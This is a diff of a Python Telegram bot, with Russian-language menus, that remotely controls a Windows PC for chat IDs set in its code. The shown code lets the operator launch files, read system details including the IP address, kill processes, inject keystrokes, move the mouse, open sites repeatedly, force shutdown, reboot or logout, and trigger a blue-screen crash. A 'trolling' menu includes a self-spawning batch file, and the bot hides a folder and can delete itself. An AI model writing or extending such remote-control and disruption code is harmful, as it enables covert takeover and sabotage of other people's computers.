-            elif message.text.strip() == 'Назад':
-                return files(message)
+        if message.text.strip() == "/start": return start(message)
+        elif message.text.strip() == 'Назад': return files_menu(message)
             
-            else:
-                os.startfile(message.text.strip())
-                bot.send_message(message.chat.id, f'*☑️ Файл {message.text.strip()} успешно запущен!*', parse_mode="Markdown")
-                return files(message)
+        try:
+            os.startfile(message.text.strip())
+            bot.send_message(message.chat.id, f'*☑️ Файл {message.text.strip()} успешно запущен!*', parse_mode="Markdown")
+            return files_menu(message)
 
         except:
             bot.send_message(message.chat.id, '❌ *Файл не найден или отсутствует доступ!* Повторите попытку', parse_mode="Markdown")
-            return files(message)
+            return files_menu(message)
 
 
 
@@ -806,28 +688,22 @@ def create_error(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Назад':
-            return console_menu(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return console_menu(message)
 
         bot.send_message(message.chat.id, '❗️ *Впишите содержимое ошибки!*', parse_mode='Markdown')
-        return bot.register_next_step_handler(message, create_error2, message.text.strip())
+        return bot.register_next_step_handler(message, create_error_check, message.text.strip())
 
-def create_error2(message, zagl):
+def create_error_check(message, title):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Назад':
-            return console_menu(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return console_menu(message)
 
         bot.send_message(message.chat.id, '❗️ *Ошибка успешно создана!*', parse_mode='Markdown')
         console_menu(message)
-        return ctypes.windll.user32.MessageBoxW(0, message.text.strip(), zagl, 0)
+        return ctypes.windll.user32.MessageBoxW(0, message.text.strip(), title, 0)
 
 
 
@@ -853,18 +729,18 @@ def console_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Ввод команд': 
+        if message.text.strip() == 'Назад': return mainmenu(message)
+        elif message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Список процессов': process_list(message)
+        
+        elif message.text.strip() == 'Ввод команд': 
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
             item0=types.KeyboardButton("tasklist")
             item1=types.KeyboardButton("ping")
             item2=types.KeyboardButton("Назад")
             markup.add(item0, item1, item2)
             bot.send_message(message.chat.id, '🖥 *Введите команду для консоли!\n\n❗️ При любых непонятных ситуациях вводите /start*', reply_markup=markup, parse_mode='Markdown')
-            return bot.register_next_step_handler(message, powershell_cmd)
-
-        elif message.text.strip() == 'Список процессов':
-            process_list(message)
-
+            return bot.register_next_step_handler(message, console_commands)
 
         elif message.text.strip() == 'Сделать скриншот':
             try:
@@ -888,7 +764,7 @@ def console_check(message):
             if active_window == None or active_window == '':
                 active_window = 'Рабочий стол'
 
-            bot.send_message(chat_id, f'⏰ Точное время запуска: *{zapusk}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f"\n*🖼 Активное окно - {active_window}*", parse_mode="Markdown")
+            bot.send_message(chat_id, f'⏰ Точное время запуска: *{startup_time}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f"\n*🖼 Активное окно - {active_window}*", parse_mode="Markdown")
             return console_menu(message)
 
         elif message.text.strip() == 'Создать ошибку':
@@ -915,12 +791,6 @@ def console_check(message):
             bot.send_message(message.chat.id, '✍️ *Введите адрес сайта!*', reply_markup=markup, parse_mode='Markdown')
             return bot.register_next_step_handler(message, open_site)
 
-        elif message.text.strip() == 'Назад':
-            return mainmenu(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
-
         else:
             bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
             return console_menu(message)
@@ -932,11 +802,8 @@ def process_list(message):
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         processes = 'Список процессов:\n\n'
         for i in psutil.pids():
-            try:
-                processes+=f'ID: {i}\nНазвание: {psutil.Process(i).name()}\nПуть: P{psutil.Process(i).exe()}\n\n'
-                        
-            except:
-                continue
+            try: processes+=f'ID: {i}\nНазвание: {psutil.Process(i).name()}\nПуть: P{psutil.Process(i).exe()}\n\n'    
+            except: continue
                 
         else:
             if os.path.exists('C:\\temp\\') == False:
@@ -963,33 +830,24 @@ def check_process_list(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Назад':
-            return console_menu(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
+        if message.text.strip() == 'Назад': return console_menu(message)
+        elif message.text.strip() == '/start': return start(message)
         
-        try:
-            int(message.text.strip())
-        
-        except ValueError:
-            return bot.send_message(message.chat.id, '❌ *Произошла ошибка! ID процесса должно быть числом*', parse_mode='Markdown')
+        if message.text.strip().isdigit() == False:
+            bot.send_message(message.chat.id, '❌ *Произошла ошибка! ID процесса должно быть числом*', parse_mode='Markdown')
+            return console_menu()
         
         kill_id = int(message.text.strip())
         parent = psutil.Process(kill_id)
 
         try:
-            for child in parent.children(recursive=True):
-                child.kill()
-            
+            for child in parent.children(recursive=True): child.kill()
             parent.kill()
         
         except psutil.NoSuchProcess:
             return bot.send_message(message.chat.id, '❌ *Произошла ошибка! Процесса с таким ID не существует*', parse_mode='Markdown')
-
         except psutil.AccessDenied:
             return bot.send_message(message.chat.id, '❌ *Произошла ошибка! Для уничтожения данного процесса недостаточно прав*', parse_mode='Markdown')
-        
         finally:
             bot.send_message(message.chat.id, f'☑️ Процесс с ID *{kill_id}* был успешно уничтожен!', parse_mode = "Markdown")
             return console_menu(message)
@@ -1000,27 +858,23 @@ def open_site(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Назад':
-            console_menu(message)
+        if message.text.strip() == 'Назад': console_menu(message)
+        elif message.text.strip() == '/start': return start(message)
 
-        elif message.text.strip() == '/start':
-            return start(message)
+        try:
+            whatopen = message.text.strip()
+            webbrowser.open(whatopen, new=1)
 
-        else:
-            try:
-                whatopen = message.text.strip()
-                webbrowser.open(str(whatopen), new=1)
+            bot.send_message(message.chat.id, f'☑️ *Вы успешно открыли {whatopen}*', parse_mode='Markdown')
+            return console_menu(message)
 
-                bot.send_message(message.chat.id, f'☑️ *Вы успешно открыли {whatopen}*', parse_mode='Markdown')
-                return console_menu(message)
-
-            except:
-                bot.send_message(message.chat.id, '❌ *Произошла ошибка! Попробуйте позже*', parse_mode='Markdown')
-                return console_menu()
+        except:
+            bot.send_message(message.chat.id, '❌ *Произошла ошибка! Попробуйте позже*', parse_mode='Markdown')
+            return console_menu()
 
 
 
-def media_buttons(message):
+def media_keys(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -1031,30 +885,23 @@ def media_buttons(message):
         markup.add(item0, item1, item2)
 
         bot.send_message(message.chat.id, '⌨️ *Вы в меню медиа-клавиш!*', reply_markup=markup, parse_mode='Markdown')
-        return bot.register_next_step_handler(message, mediabuttons_check)
+        return bot.register_next_step_handler(message, media_keys_check)
 
 
-def mediabuttons_check(message):
+def media_keys_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Пауза/Старт':
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return keyboard_menu(message)
+        elif message.text.strip() == 'Пауза/Старт':
             keyboard.send('play/pause media')
-            return media_buttons(message)
-
+            return media_keys(message)
         elif message.text.strip() == 'Перемотка вперёд':
             keyboard.send('alt+right')
-            return media_buttons(message)
+            return media_keys(message)
 
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Назад':
-            return keyboard_menu(message)
-
-        else:
-            return media_buttons(message)
-
+        return media_keys(message)
 
 
 def keyboard_menu(message):
@@ -1075,28 +922,17 @@ def keyboard_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Назад':
-            return mainmenu(message)
+        if message.text.strip() == 'Назад': return mainmenu(message)
+        elif message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Напечатать что-то': return keyboard_write(message)
+        elif message.text.strip() == 'Нажать клавиши': return keyboard_keys(message)
+        elif message.text.strip() == 'Медиа-клавиши': return media_keys(message)
 
-        elif message.text.strip() == 'Напечатать что-то':
-            return keyboard_word(message)
-
-        elif message.text.strip() == 'Нажать клавиши':
-            return keyboard_keys(message)
-
-        elif message.text.strip() == 'Медиа-клавиши':
-            return media_buttons(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        else:
-            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
-            return keyboard_menu(message)
+        bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
+        return keyboard_menu(message)
 
 
-
-def keyboard_word(message):
+def keyboard_write(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
@@ -1113,58 +949,46 @@ def keyboard_word(message):
         item9=types.KeyboardButton("Назад")
         markup.add(item0, item1, item2, item3, item4, item5, item6, item7, item8, item9)
         bot.send_message(message.chat.id, '⌨️ *Впишите то, что хотите написать, или выберите клавиши из списка ниже!\nВписать собственное вы может по примеру ниже:\nalt+f4, enter - нажмется alt+f4 вместе, а только потом enter*', reply_markup=markup, parse_mode='Markdown')
-        return bot.register_next_step_handler(message, keyboard_word2)
+        return bot.register_next_step_handler(message, keyboard_write_check)
 
-def keyboard_word2(message):
+def keyboard_write_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == "Назад":
-            return keyboard_menu(message)
-        
-        elif message.text.strip() == '/start':
-            return start(message)
+        if message.text.strip() == "Назад": return keyboard_menu(message)
+        elif message.text.strip() == '/start': return start(message)
 
         elif message.text.strip() == "enter":
             keyboard.press("enter")
-            return keyboard_word(message)
-
+            return keyboard_write(message)
         elif message.text.strip() == "backspace":
             keyboard.press("backspace")
-            return keyboard_word(message)
-
+            return keyboard_write(message)
         elif message.text.strip() == "space":
             keyboard.press("space")
-            return keyboard_word(message)
-
+            return keyboard_write(message)
         elif message.text.strip() == "tab":
             keyboard.press("tab")
-            return keyboard_word(message)
-
+            return keyboard_write(message)
         elif message.text.strip() == "ctrl+a":
             keyboard.press("ctrl+a")
-            return keyboard_word(message)
-
+            return keyboard_write(message)
         elif message.text.strip() == "ctrl+z":
             keyboard.press("ctrl+z")
-            return keyboard_word(message)
-
+            return keyboard_write(message)
         elif message.text.strip() == "ctrl+c":
             keyboard.press("ctrl+c")
-            return keyboard_word(message)
-
+            return keyboard_write(message)
         elif message.text.strip() == "ctrl+v":
             keyboard.press("ctrl+v")
-            return keyboard_word(message)
-
+            return keyboard_write(message)
         elif message.text.strip() == "ctrl+s":
             keyboard.press("ctrl+s")
-            return keyboard_word(message)
-
-        else:
-            word = message.text.strip()
-            keyboard.write(word, delay=0.25)
-            return keyboard_word(message)
+            return keyboard_write(message)
+        
+        word = message.text.strip()
+        keyboard.write(word, delay=0.25)
+        return keyboard_write(message)
 
 
 
@@ -1183,24 +1007,19 @@ def keyboard_keys(message):
         markup.add(item0, item1, item2, item3, item4, item5, item6)
         
         bot.send_message(message.chat.id, '⌨️ *Впишите или выберите ниже то, что хотите выполнить!*', reply_markup=markup, parse_mode='Markdown')
-        return bot.register_next_step_handler(message, keyboard_keys2)
+        return bot.register_next_step_handler(message, keyboard_keys_check)
 
-def keyboard_keys2(message):
+def keyboard_keys_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        if message.text.strip() == "Назад": return keyboard_menu(message)
+        elif message.text.strip() == '/start': return start(message)
+
         try:
-            if message.text.strip() == "Назад":
-                return keyboard_menu(message)
-
-            elif message.text.strip() == '/start':
-                return start(message)
-
-            else:
-                word = message.text.strip()
-                keyboard.send(word)
-                return keyboard_keys(message)
-        
+            word = message.text.strip()
+            keyboard.send(word)
+            return keyboard_keys(message)
         except ValueError:
             bot.send_message(message.chat.id, '❌ *Одна или несколько из клавиш не была найдена! Повторите попытку*', parse_mode='Markdown')
             return keyboard_keys(message)
@@ -1226,11 +1045,8 @@ def samp_check(message):
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         cmd = message.text.strip()
 
-        if cmd == "Назад":
-            return mainmenu(message)
-
-        elif cmd == "/start":
-            return start(message)
+        if cmd == "Назад": return mainmenu(message)
+        elif cmd == "/start": return start(message)
 
         elif message.text.strip() == 'Подключение к SAMP серверу':
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
@@ -1248,66 +1064,47 @@ def samp_check(message):
             bot.send_message(message.chat.id, '✍️ *Введите информацию по форме ниже:\nnickname,ip,port\nПример: Little_Bot,127.0.0.1,7777*', parse_mode='Markdown', reply_markup=markup)
             return bot.register_next_step_handler(message, raklite_connect)
 
-        else:
-            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
-            return samp_menu(message)
+        bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
+        return samp_menu(message)
 
 
 
-def mainmenu(message):
+def samp_connect(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
-        item0=types.KeyboardButton("/start")
-        item1=types.KeyboardButton("Консоль")
-        item2=types.KeyboardButton("Настройки ПК")
-        item3=types.KeyboardButton("Файлы и папки")
-        item4=types.KeyboardButton("Клавиши")
-        item5=types.KeyboardButton("Троллинг")
-        item6=types.KeyboardButton("SAMP функции")
-        item7=types.KeyboardButton("Меню биндов")
-        item8=types.KeyboardButton("Особые функции")
-        markup.add(item0, item1, item2, item3, item4, item5, item6, item7, item8)
-        
-        bot.send_message(message.chat.id, '*📌 Вы в главном меню!*', reply_markup=markup, parse_mode='Markdown')
-        return bot.register_next_step_handler(message, check_main)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return samp_menu(message)
 
-def check_main(message):
+        try:
+            bot.send_message(message.chat.id, f'☑️ Подключаемся к серверу с IP *{ message.text.strip()}*...', parse_mode = "Markdown")
+            samp_menu(message)
+            return subprocess.Popen(f'{samp_route}\samp.exe {message.text.strip()}', shell=True)
+        
+        except:
+            bot.send_message(message.chat.id, '❌ Произошла ошибка! Проверьте ваш settings.ini', parse_mode = "Markdown")
+            return samp_menu(message)
+
+
+def raklite_connect(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Файлы и папки':
-            return files(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return samp_menu(message)
 
-        elif message.text.strip() == 'Консоль':
-            return console_menu(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Клавиши':
-            return keyboard_menu(message)
-
-        elif message.text.strip() == 'Меню биндов':
-            return bind_menu(message)
-        
-        elif message.text.strip() == 'Троллинг':
-            return packs(message)
-
-        elif message.text.strip() == 'Особые функции':
-            return other_functions(message)
-
-        elif message.text.strip() == 'SAMP функции':
+        info = message.text.strip().split(',') # ник,ip,port
+        if len(info) != 3:
+            bot.send_message(message.chat.id, '*❌ Вы не дописали все аргументы! Проверьте ваше сообщение и повторите попытку позже*', parse_mode = "Markdown")
             return samp_menu(message)
 
-        elif message.text.strip() == 'Настройки ПК':
-            return pc_settings(message)
+        bot.send_message(message.chat.id, f'☑️ Подключаемся к *{info[1]}:{info[2]}*', parse_mode = "Markdown")
+        samp_menu(message)
 
-        else:
-            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
-            return mainmenu(message)
-
+        try: return subprocess.Popen(f'"{raklite_route}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z', shell=True)
+        except:
+            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
+            return samp_menu(message)
 
 
 def other_functions(message):
@@ -1315,31 +1112,33 @@ def other_functions(message):
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
-        item0=types.KeyboardButton("Удаление папки со скриптом")
-        item1=types.KeyboardButton("Выход из скрипта")
-        item2=types.KeyboardButton("Вызывать BSOD")
-        item3=types.KeyboardButton("Выход из учетной записи")
-        item4=types.KeyboardButton("Назад")
-        markup.add(item0, item1, item2, item3, item4)
+        item0 = types.KeyboardButton("Перезагрузка ПК") 
+        item1 = types.KeyboardButton("Выход из учетки ПК")
+        item2 = types.KeyboardButton("Вызвать Exception (при раздвоении)")
+        item3 = types.KeyboardButton("Выход из скрипта")
+        item4 = types.KeyboardButton("Вызывать BSOD")
+        item5 = types.KeyboardButton("Удаление папки со скриптом")
+        item6 = types.KeyboardButton("Назад")
+        markup.add(item0, item1, item2, item3, item4, item5, item6)
         bot.send_message(message.chat.id, '🔑 *Выберите нужную функцию!*', reply_markup=markup, parse_mode='Markdown')
         return bot.register_next_step_handler(message, check_other)
+
 
 
 def check_other(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Удаление папки со скриптом':
-            return full_delete(message)
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return mainmenu(message)
+        elif message.text.strip() == 'Удаление папки со скриптом': return full_delete(message)
+        elif message.text.strip() == 'Выход из скрипта': return script_exit(message)
+        elif message.text.strip() == 'Выход из учетной записи': return logout(message)
+        elif message.text.strip() == 'Перезагрузка ПК': return reboot(message) 
 
-        elif message.text.strip() == 'Выход из скрипта':
-            return script_exit(message)
-
-        elif message.text.strip() == 'Назад':
-            return mainmenu(message)
-
-        elif message.text.strip() == 'Выход из учетной записи':
-            return logout(message)
+        elif message.text.strip() == 'Вызвать Exception':
+            bot.send_message(message.chat.id, '😢 *Не забудьте написать /start*', parse_mode='Markdown')
+            return 1/0
 
         elif message.text.strip() == 'Вызывать BSOD':
             markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
@@ -1349,12 +1148,40 @@ def check_other(message):
             bot.send_message(message.chat.id, '❌ *Вы уверены, что хотите вызвать BSOD?*', parse_mode='Markdown', reply_markup=markup)
             return bot.register_next_step_handler(message, bsod)
 
-        elif message.text.strip() == '/start':
-            return start(message)
-
         else:
             bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
             return other_functions(message)
+
+
+def reboot(message):
+    get_chat_id = message.chat.id
+    
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
+        item0=types.KeyboardButton("Да, подтверждаю")
+        item1=types.KeyboardButton("Нет, я передумал")
+        markup.add(item0, item1)
+
+        bot.send_message(message.chat.id, '😢 *Подтвердите перезагрузку ПК!*', reply_markup=markup, parse_mode='Markdown')
+        return bot.register_next_step_handler(message, reboot_check)
+    
+def reboot_check(message):
+    get_chat_id = message.chat.id
+    
+    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Да, подтверждаю':
+            bot.send_message(message.chat.id, '☑️ *Вы успешно вызвали перезагрузку ПК*', parse_mode='Markdown')
+            return subprocess.run('shutdown -r -t 0')
+
+        elif message.text.strip() == 'Нет, я передумал':
+            bot.send_message(message.chat.id, '🎉 *Вы отменили перезагрузку ПК!*', parse_mode='Markdown')
+            return other_functions(message)
+
+        bot.send_message(message.chat.id, '🎉 *Вы отменили перезагрузку ПК!*', parse_mode='Markdown')
+        return other_functions(message)
+    
+
 
 def logout(message):
     get_chat_id = message.chat.id
@@ -1366,13 +1193,14 @@ def logout(message):
         markup.add(item0, item1)
 
         bot.send_message(message.chat.id, '😢 *Подтвердите выход из учетной записи!*', reply_markup=markup, parse_mode='Markdown')
-        return bot.register_next_step_handler(message, check_logout)
+        return bot.register_next_step_handler(message, logout_check)
 
-def check_logout(message):
+def logout_check(message):
     get_chat_id = message.chat.id
     
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Да, подтверждаю':
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Да, подтверждаю':
             bot.send_message(message.chat.id, '☑️ *Вы успешно вышли из учетной записи*', parse_mode='Markdown')
             return subprocess.run('shutdown /l')
 
@@ -1380,12 +1208,8 @@ def check_logout(message):
             bot.send_message(message.chat.id, '🎉 *Вы отменили выход из учетной записи!*', parse_mode='Markdown')
             return other_functions(message)
 
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        else:
-            bot.send_message(message.chat.id, '🎉 *Вы отменили выход из учетной записи!*', parse_mode='Markdown')
-            return other_functions(message)
+        bot.send_message(message.chat.id, '🎉 *Вы отменили выход из учетной записи!*', parse_mode='Markdown')
+        return other_functions(message)
 
 
 
@@ -1405,20 +1229,16 @@ def check_exit(message):
     get_chat_id = message.chat.id
     
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Да, подтверждаю':
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Да, подтверждаю':
             bot.send_message(message.chat.id, '😥 *Вы завершили работу скрипта!*', parse_mode='Markdown')
             return os.abort()
-
         elif message.text.strip() == 'Нет, я передумал':
             bot.send_message(message.chat.id, '🎉 *Вы отменили завершение работы скрипта!*', parse_mode='Markdown')
             return other_functions(message)
 
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        else:
-            bot.send_message(message.chat.id, '🎉 *Вы отменили завершение работы скрипта!*', parse_mode='Markdown')
-            return other_functions(message)
+        bot.send_message(message.chat.id, '🎉 *Вы отменили завершение работы скрипта!*', parse_mode='Markdown')
+        return other_functions(message)
 
 
 def packs(message):
@@ -1441,16 +1261,13 @@ def check_packs(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Выключение ПК':
+        if message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Назад': return mainmenu(message)
+
+        elif message.text.strip() == 'Выключение ПК':
             bot.send_message(message.chat.id, '☑️ *Вы успешно использовали функцию выключения ПК!*', parse_mode='Markdown')
             subprocess.Popen('shutdown /s /t 0', shell=True)
             return packs(message)
-
-        elif message.text.strip() == '/start':
-            return start(message)
-        
-        elif message.text.strip() == 'Назад':
-            return mainmenu(message)
 
         elif message.text.strip() == 'start %0 %0':
             my_file = open("troll.bat", "w", encoding="utf-8")
@@ -1473,9 +1290,8 @@ def check_packs(message):
             bot.send_message(message.chat.id, '✍️ *Введите сколько секунд вы хотите перемещать мышь!*', parse_mode='Markdown')
             return bot.register_next_step_handler(message, mouse_troll)
 
-        else:
-            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
-            return packs(message)
+        bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
+        return packs(message)
 
 
 
@@ -1484,14 +1300,9 @@ def mouse_troll(message):
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         xmouse = message.text.strip()
-
-        if str(xmouse) == "/start":
-            return start(message)
-
-        try:
-            int(xmouse)
+        if xmouse == "/start": return start(message)
         
-        except ValueError:
+        if xmouse.isdigit() == False:
             bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
             return packs(message)
 
@@ -1511,8 +1322,7 @@ def mouse_troll(message):
                 pyautogui.moveTo(1263, 825, duration=0.10)
                 pyautogui.moveTo(558, 265, duration=0.10)
 
-            else:
-                return bot.send_message(message.chat.id, '☑️ *Скрипт на перемещение мышки успешно выполнился!*', parse_mode='Markdown')
+            return bot.send_message(message.chat.id, '☑️ *Скрипт на перемещение мышки успешно выполнился!*', parse_mode='Markdown')
 
 
 
@@ -1520,27 +1330,19 @@ def troll_provod(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        xprovod = message.text.strip()
+        xexplorer = message.text.strip()
+        if xexplorer == "/start": return start(message)
 
-        if str(xprovod) == "/start":
-            return start(message)
-
-        try:
-            int(xprovod)
-        
-        except ValueError:
+        if message.text.strip().isdigit() == False:
             bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
             return packs(message)
 
         else:
-            bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xprovod} раз!*', parse_mode='Markdown')
+            bot.send_message(message.chat.id, f'☑️ *Скрипт успешно начал выполняться {xexplorer} раз!*', parse_mode='Markdown')
             packs(message)
 
-            for i in range(int(xprovod)):
-                return keyboard.send("win+e")
-
-            else:
-                return bot.send_message(message.chat.id, '☑️ *Скрипт на открытие проводника успешно выполнился!*', parse_mode='Markdown')
+            for i in range(int(xexplorer)): return keyboard.send("win+e")
+            return bot.send_message(message.chat.id, '☑️ *Скрипт на открытие проводника успешно выполнился!*', parse_mode='Markdown')
 
 
 
@@ -1549,14 +1351,9 @@ def troll_site(message):
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         xsite = message.text.strip()
+        if xsite == "/start": return start(message)
 
-        if str(xsite) == "/start":
-            return start(message)
-
-        try:
-            int(xsite)
-        
-        except ValueError:
+        if message.text.strip().isdigit() == False:
             bot.send_message(message.chat.id, f'❌ *Количество раз должно быть числом!*', parse_mode='Markdown')
             return packs(message)
 
@@ -1571,8 +1368,7 @@ def troll_site(message):
                 webbrowser.open('https://yandex.ru', new = 1)
                 webbrowser.open('https://edu.gounn.ru', new = 1)
                             
-            else:
-                return bot.send_message(message.chat.id, '☑️ *Скрипт на открытие сайтов успешно выполнился!*', parse_mode='Markdown')
+            else: return bot.send_message(message.chat.id, '☑️ *Скрипт на открытие сайтов успешно выполнился!*', parse_mode='Markdown')
 
 
 def full_delete(message):
@@ -1586,15 +1382,14 @@ def full_delete_open(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
+        if str(message.text.strip()) == "/start": return start(message)
+
         if os.path.exists('C:\\temp') == False:
             fileName = r'C:\temp'
             os.mkdir(fileName)
             kernel32 = ctypes.windll.kernel32
             attr = kernel32.GetFileAttributesW(fileName)
             kernel32.SetFileAttributesW(fileName, attr | 2)
-
-        if str(message.text.strip()) == "/start":
-            return start(message)
 
         else:
             my_file = open("C:\\temp\\DeleteFile.py", "w", encoding="utf-8")
@@ -1621,14 +1416,9 @@ def pc_settings_check(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip() == 'Назад':
-            return mainmenu(message)
-        
-        elif message.text.strip() == '/start':
-            return start(message)
-
-        elif message.text.strip() == 'Изменить яркость':
-            return brightness_set(message) 
+        if message.text.strip() == 'Назад': return mainmenu(message)
+        elif message.text.strip() == '/start': return start(message)
+        elif message.text.strip() == 'Изменить яркость': return brightness_set(message) 
 
         else:
             bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
@@ -1650,22 +1440,14 @@ def check_brightness_set(message):
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         level = message.text.strip()
+        if level  == 'Назад': return pc_settings(message)
+        elif level == '/start': return start(message)
 
-        if level  == 'Назад':
+        if message.text.strip().isdigit() == False:
+            bot.send_message(message.chat.id, f'❌ *Уровень яркости должен быть числом!*', parse_mode='Markdown')
             return pc_settings(message)
 
-        elif level == '/start':
-            return start(message)
-
-        try:
-            int(level)
-        
-        except ValueError:
-            bot.send_message(message.chat.id, f'❌ *Уровень должен быть числом!*', parse_mode='Markdown')
-            return pc_settings(message)
-
-        if int(level) < 1 or int(level) > 100:
-            return bot.send_message(message.chat.id, f'❌ *Уровень должен быть больше 1 и меньше 100!*', parse_mode='Markdown')
+        if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'❌ *Уровень должен быть больше 0 и меньше 100!*', parse_mode='Markdown')
         
